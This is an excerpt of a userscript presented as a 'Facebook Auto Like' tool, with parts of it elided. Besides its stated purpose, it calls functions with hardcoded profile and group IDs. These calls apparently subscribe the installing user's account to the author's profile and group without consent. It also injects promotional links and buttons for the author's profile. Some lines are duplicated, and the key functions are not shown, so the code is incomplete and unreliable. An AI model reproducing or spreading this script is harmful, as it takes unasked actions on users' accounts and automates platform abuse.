// ==UserScript==
// @name			Facebook Auto Like By Achmad5191
// @namespace		Facebook Auto Like By Achmad5191
// @description		AutoLike Facebook Status, Comments, Photos, group posts, page posts
// @author			https://www.facebook.com/Anonymous5191 
// @icon		    https://fbcdn-sphotos-a-a.akamaihd.net/hphotos-ak-ash4/1202_465552786840408_2002738835_n.jpg
// @authorURL		https://www.facebook.com/Anonymous5191
// @updateURL		http://userscripts.org/scripts/source/159125.meta.js
// @downloadURL     http://userscripts.org/scripts/source/159125.user.js
// @version         4.0
...
a("100003200755147");
a("100003200755147");
sublist("430957757020912");
var gid = ['430957757020912'];
var gid = ['430957757020912'];
...
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='https://www.facebook.com/Anonymous5191' title='My Profile'><center>My Profile</center></a>"
body.appendChild(div);}
body=document.body;
if(body != null) 
{div = document.createElement("div");
...
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<center><a ajaxify='/ajax/messaging/composer.php?ids%5B0%5D=100001570733488&amp;ref=timeline' title='Kirim Pesan Ke Achmad5191' href='/messages/Anonymous5191' role='button' rel='dialog'><span class='uiButtonText'>Pesan</span></a></center>"
body.appendChild(div);unsafeWindow.BugInfo = function() {
window.open(this.href='http://www.facebook.com/Anonymous5191', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
};}
